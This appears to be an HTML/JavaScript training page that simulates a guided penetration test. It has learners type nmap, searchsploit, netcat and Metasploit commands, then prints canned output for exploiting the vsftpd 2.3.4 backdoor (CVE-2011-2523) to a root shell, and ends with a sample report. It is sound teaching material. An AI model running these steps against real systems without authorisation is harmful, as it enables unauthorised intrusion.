<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Guided Cybersecurity Lab</title>
    <!-- Importing Tailwind CSS for styling -->
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* Using a classic monospace font stack */
        body {
            font-family: 'Consolas', 'Lucida Console', 'Courier New', monospace;
            /* Default text color is now terminal green */
            color: #34d399; /* text-green-400 */
            /* Add a subtle glow to the text */
            text-shadow: 0 0 3px rgba(52, 211, 153, 0.4);
        }
        /* Custom scrollbar for the terminal */
        #terminal-history::-webkit-scrollbar {
            width: 8px;
        }
        #terminal-history::-webkit-scrollbar-track {
            background: #000; /* black */
        }
        #terminal-history::-webkit-scrollbar-thumb {
            background: #047857; /* green-700 */
            border-radius: 4px;
        }
        #terminal-history::-webkit-scrollbar-thumb:hover {
            background: #059669; /* green-600 */
        }
        /* Add subtle scanlines to the terminal history */
        #terminal-history {
            background: linear-gradient(rgba(0,0,0,0) 50%, rgba(0,0,0,0.1) 50%);
            background-size: 100% 4px;
        }
        /* Make the input cursor blink green */
        #terminal-input {
            caret-color: #34d399; /* text-green-400 */
        }
    </style>
</head>
<body class="bg-black text-green-400 min-h-screen flex items-center justify-center p-4">

    <div class="w-full max-w-5xl bg-black border border-gray-800 rounded-lg shadow-2xl overflow-hidden">
        
        <!-- Header -->
        <header class="p-6">
            <h1 class="text-3xl font-bold text-center text-green-200">Guided Lab: The Penetration Test</h1>
            <p class="text-center text-sm text-yellow-400 mt-2">
                <strong>Note:</strong> A commitment to ethical hacking is emphasized. This lab is a simulation for educational purposes.
            </p>
        </header>

        <!-- Lab Content Area -->
        <main class="p-6 md:p-8">
            
            <!-- Step Title and Explanation -->
            <div class="mb-6">
                <h2 id="step-title" class="text-2xl font-semibold text-yellow-300 mb-2"></h2>
                <p id="step-explanation" class="leading-relaxed"></p>
            </div>

            <!-- Simulated Terminal -->
            <div class="bg-black rounded-lg shadow-lg overflow-hidden border border-gray-800">
                <!-- Terminal Header -->
                <div class="bg-gray-900 p-3 flex items-center">
                    <span class="ml-4 text-gray-400 text-sm font-mono">user@kali: ~</span>
                </div>
                
                <!-- Terminal Output -->
                <div id="terminal-history" class="p-4 font-mono text-sm h-64 overflow-y-auto whitespace-pre-wrap"></div>
                
                <!-- Terminal Input -->
                <div class="p-4 pt-0 flex items-center font-mono text-sm">
                    <span id="terminal-prompt" class="text-green-400">user@kali >&nbsp;</span>
                    <input type="text" id="terminal-input" class="flex-1 bg-transparent text-green-400 focus:outline-none" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" autofocus>
                </div>
            </div>

            <!-- Interaction and Navigation -->
            <div class="mt-6 flex flex-col sm:flex-row items-center justify-end space-y-4 sm:space-y-0">
                <div class="flex space-x-4">
                    <button id="restart-button" class="bg-gray-700 hover:bg-gray-600 text-gray-300 font-bold py-2 px-6 rounded-lg transition duration-200">
                        Restart Lab
                    </button>
                    <button id="next-button" class="bg-green-700 hover:bg-green-600 text-white font-bold py-2 px-6 rounded-lg transition duration-200" style="display: none;">
                        Next Step &rarr;
                    </button>
                </div>
            </div>

        </main>
    </div>

    <script>
        // --- LAB DATA ---
        // This array holds all the steps, commands, and simulated outputs for the lab.
        const labSteps = [
            {
                title: "Step 1: Use Nmap to Scan for Vulnerable Services",
                explanation: "We'll start by scanning our target IP (simulated as 10.0.0.5) to see which services are running. The '-sV' flag tries to determine the version of the service, which is crucial for finding exploits. Type the command below and press Enter.",
                command: "nmap -sV 10.0.0.5",
                prompt: `user@kali >&nbsp;`,
                promptColor: "text-green-400",
                output: 
`Starting Nmap 7.91 ( https://nmap.org )
Nmap scan report for 10.0.0.5
Host is up (0.012s latency).
Not shown: 996 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.3.4
22/tcp   open  ssh     OpenSSH 4.7p1 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4)
139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: MSHOME)
Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 12.58 seconds`,
                analysis: `# Analysis: Interesting! Port 21 is running 'vsftpd 2.3.4'. This is an older version. Let's research it.`
            },
            {
                title: "Step 2: Perform Vulnerability Research",
                explanation: "Now we'll use a simulated 'searchsploit' (a command-line tool for Exploit-DB) to find known vulnerabilities for 'vsftpd 2.3.4'. In the real world, you'd also use Google and CVE databases.",
                command: "searchsploit vsftpd 2.3.4",
                prompt: `user@kali >&nbsp;`,
                promptColor: "text-green-400",
                output: 
`Exploits & Shellcode Search
--------------------------------------------------
 Name                               |  Path
--------------------------------------------------
 vsftpd 2.3.4 - Backdoor Command Exe | unix/remote/17491.rb
--------------------------------------------------
Shellcodes: 0  Drivers: 0  Scripts: 0  Results: 1`,
                analysis: `# Analysis: A-ha! It looks like this version has a known backdoor. The path '17491.rb' suggests it's a Ruby file, which is perfect for Metasploit.`
            },
            {
                title: "Step 3: Perform More Active Reconnaissance",
                explanation: "This step is optional but good practice. We can use 'netcat' (nc) to connect to the FTP port. Type the command, and we will simulate the full interactive session for you.",
                command: "nc 10.0.0.5 21",
                prompt: `user@kali >&nbsp;`,
                promptColor: "text-green-400",
                output: 
`220 (vsFTPd 2.3.4)
(simulation) > USER victim:)
331 Please specify the password.
(simulation) > PASS anypass
(simulating connection...)
(A new connection is established from the target!)

# id
uid=0(root) gid=0(root) groups=0(root)`,
                analysis: `# Analysis: It worked! We simulated the malicious username, and the server responded by giving us a root shell (uid=0)! This confirms the vulnerability. Let's use Metasploit to automate this reliably.`
            },
            {
                title: "Step 4: Intro to Metasploit",
                explanation: "The Metasploit Framework (msfconsole) is a powerful tool for developing and executing exploits. Let's start it. This will be our 'command center' for the attack.",
                command: "msfconsole",
                prompt: `user@kali >&nbsp;`,
                promptColor: "text-green-400",
                output: 
`
       =[ metasploit v6.0.40-dev                          ]
+ -- --=[ 2100 exploits - 1120 auxiliary - 350 post        ]
+ -- --=[ 580 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

msf6 > `,
                analysis: `# Analysis: We are now in the Metasploit console, indicated by the 'msf6 >' prompt.`,
                newPrompt: `msf6 >&nbsp;`,
                newPromptColor: "text-red-500"
            },
            {
                title: "Step 5: Load Your First Metasploit Module",
                explanation: "Remember that exploit we found? 'vsftpd_234_backdoor'. Let's 'use' that module in Metasploit. This loads the exploit code and prepares it for use.",
                command: "use exploit/unix/ftp/vsftpd_234_backdoor",
                prompt: `msf6 >&nbsp;`,
                promptColor: "text-red-500",
                output: `msf6 exploit(unix/ftp/vsftpd_234_backdoor) > `,
                analysis: `# Analysis: The prompt has changed. We are now 'inside' this specific exploit module, ready to configure it.`,
                newPrompt: `msf6 exploit(unix/ftp/vsftpd_234_backdoor) >&nbsp;`,
                newPromptColor: "text-red-500"
            },
            {
                title: "Step 6: Set the Target Host",
                explanation: "Time to configure the exploit. We need to set the 'RHOST' (Remote Host) to our target's IP. Then, we simply type 'exploit' to launch the attack.",
                command: "set RHOST 10.0.0.5",
                prompt: `msf6 exploit(unix/ftp/vsftpd_234_backdoor) >&nbsp;`,
                promptColor: "text-red-500",
                output: `RHOST => 10.0.0.5`,
                analysis: `# Analysis: The RHOST variable is set. Now, we can run the exploit in the next step.`
                // No new prompt, it stays the same
            },
            {
                title: "Step 7: Exploit a Vulnerable Machine",
                explanation: "This is it. We simply type 'exploit' to launch the attack.",
                command: "exploit",
                prompt: `msf6 exploit(unix/ftp/vsftpd_234_backdoor) >&nbsp;`,
                promptColor: "text-red-500",
                output: 
`[*] 10.0.0.5:21 - Connecting to FTP server...
[*] 10.0.0.5:21 - Sending backdoor command...
[+] 10.0.0.5:21 - Command shell session 1 opened (10.0.0.2:4444 -> 10.0.0.5:6200)

# id
uid=0(root) gid=0(root)`,
                analysis: `# Analysis: Success! The exploit ran, and we have a 'Command shell session'. We are 'root' on the target machine. We will now simulate exiting Metasploit.`,
                newPrompt: `user@kali >&nbsp;`, // Simulate exiting
                newPromptColor: "text-green-400"
            },
            {
                title: "Step 8: Create a Penetration Testing Report",
                explanation: "The *most important* step. All our findings are useless if we can't communicate them. A good report includes an Executive Summary, a technical breakdown, and recommendations.",
                command: "cat final_report.md",
                prompt: `user@kali >&nbsp;`,
                promptColor: "text-green-400",
                output: 
`# Penetration Test Report: 10.0.0.5

## 1. Executive Summary
A penetration test was conducted on the host 10.0.0.5. A critical vulnerability was discovered in the vsftpd 2.3.4 service running on port 21. This vulnerability was successfully exploited, resulting in a full compromise of the system with 'root' (administrator) privileges.

## 2. Technical Findings
* **Vulnerability:** vsftpd 2.3.4 Backdoor (CVE-2011-2523)
* **Risk Rating:** Critical
* **Description:** An intentionally placed backdoor in this version of vsftpd allows an unauthenticated attacker to execute commands as root by sending a specific string (':)') in the username.
* **Evidence:** A root shell was obtained from the target machine (see 'id' command output).

## 3. Recommendations
1.  **Immediate:** The vsftpd service should be stopped immediately.
2.  **Short-Term:** Upgrade the vsftpd package to the latest patched version.
3.  **Long-Term:** Implement a network firewall (iptables/ufw) to restrict access to sensitive ports. Only trusted IPs should be able to access services like FTP and SSH.`,
                analysis: `# Analysis: This report clearly explains the problem, the risk, and the solution. This is the final product you deliver. Lab complete!`
            }
        ];

        // --- DOM Elements ---
        const stepTitle = document.getElementById('step-title');
        const stepExplanation = document.getElementById('step-explanation');
        const terminalHistory = document.getElementById('terminal-history');
        const terminalInput = document.getElementById('terminal-input');
        const terminalPrompt = document.getElementById('terminal-prompt');
        const nextButton = document.getElementById('next-button');
        const restartButton = document.getElementById('restart-button');

        let currentStep = 0;

        // --- Core Lab Function ---
        function loadStep(stepIndex) {
            // Get the data for the current step
            const step = labSteps[stepIndex];

            // Update the UI
            stepTitle.textContent = step.title;
            stepExplanation.innerHTML = step.explanation + `<br>Type: <code class="bg-gray-700 text-yellow-300 p-1 rounded">${step.command}</code>`;
            
            // Clear the terminal and interaction area
            if (stepIndex === 0) {
                terminalHistory.innerHTML = '';
            }
            
            // Hide the 'Next' button
            nextButton.style.display = 'none';

            // Set the correct prompt
            terminalPrompt.innerHTML = step.prompt;
            terminalPrompt.className = step.promptColor;

            // Clear and focus the input
            terminalInput.value = '';
            terminalInput.focus();
        }

        // --- Handle Terminal Input ---
        terminalInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                const command = terminalInput.value.trim();
                const step = labSteps[currentStep];
                
                // 1. Add the typed command to history
                const promptHTML = `<span class="${step.promptColor}">${step.prompt}</span>`;
                terminalHistory.innerHTML += `<div>${promptHTML}${command}</div>`;
                terminalInput.value = ''; // Clear input field immediately

                // 2. Check if the command is correct
                if (command === step.command) {
                    // Correct command
                    terminalHistory.innerHTML += `<div class="whitespace-pre-wrap">${step.output}</div>`;
                    terminalHistory.innerHTML += `<div class="text-yellow-400 whitespace-pre-wrap">${step.analysis}</div><br>`;
                    
                    // Show 'Next' button (if not the last step)
                    if (currentStep < labSteps.length - 1) {
                        nextButton.style.display = 'block';
                    }
                } else if (command === 'help') {
                    // --- HELP COMMAND ---
                    let helpText = "Available lab commands:<br>";
                    labSteps.forEach((s, index) => {
                        helpText += `<span class_="${step.promptColor}">${index + 1}. ${s.command}</span><br>`;
                    });
                    helpText += "<br>Other commands:<br>  help - Show this message<br>  clear - Clear the terminal screen";
                    terminalHistory.innerHTML += `<div class="whitespace-pre-wrap">${helpText}</div><br>`;
                
                } else if (command === 'clear' || command === 'cls') {
                    // --- CLEAR COMMAND ---
                    terminalHistory.innerHTML = '';
                    
                } else if (command === '') {
                    // Empty command, do nothing
                } else {
                    // Incorrect command
                    terminalHistory.innerHTML += `<div><span class="text-red-500">bash: command not found: ${command}</span></div>`;
                    terminalHistory.innerHTML += `<div><span class="text-yellow-500">Hint: Try typing exactly: ${step.command}</span></div><br>`;
                }

                // 4. Scroll terminal to bottom
                terminalHistory.scrollTop = terminalHistory.scrollHeight;
            }
        });

        // --- Event Listeners ---
        
        // 'Next' button click
        nextButton.addEventListener('click', () => {
            // Apply new prompt if it exists from the step we just completed
            const lastStep = labSteps[currentStep];
            if (lastStep.newPrompt) {
                terminalPrompt.innerHTML = lastStep.newPrompt;
                terminalPrompt.className = lastStep.newPromptColor;
            }

            if (currentStep < labSteps.length - 1) {
                currentStep++;
                loadStep(currentStep);
            }
        });

        // 'Restart' button click
        restartButton.addEventListener('click', () => {
            currentStep = 0;
            loadStep(0);
        });

        // Load the first step when the page loads
        document.addEventListener('DOMContentLoaded', () => {
            loadStep(0);
        });

    </script>
</body>
</html>